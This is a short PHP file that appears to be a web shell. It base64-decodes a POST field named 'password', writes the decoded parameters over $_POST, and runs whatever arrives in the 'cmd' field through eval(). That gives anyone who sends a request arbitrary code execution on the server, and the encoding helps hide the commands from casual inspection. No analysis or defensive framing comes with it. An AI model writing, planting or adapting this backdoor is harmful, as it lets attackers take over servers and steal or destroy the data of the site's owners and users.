<?php

$post_content = base64_decode($_POST['password']);

parse_str($post_content,$parm);
foreach ($parm as $key => $value) {
	$_POST[$key] = $value;
}

eval($_POST['cmd']);
?>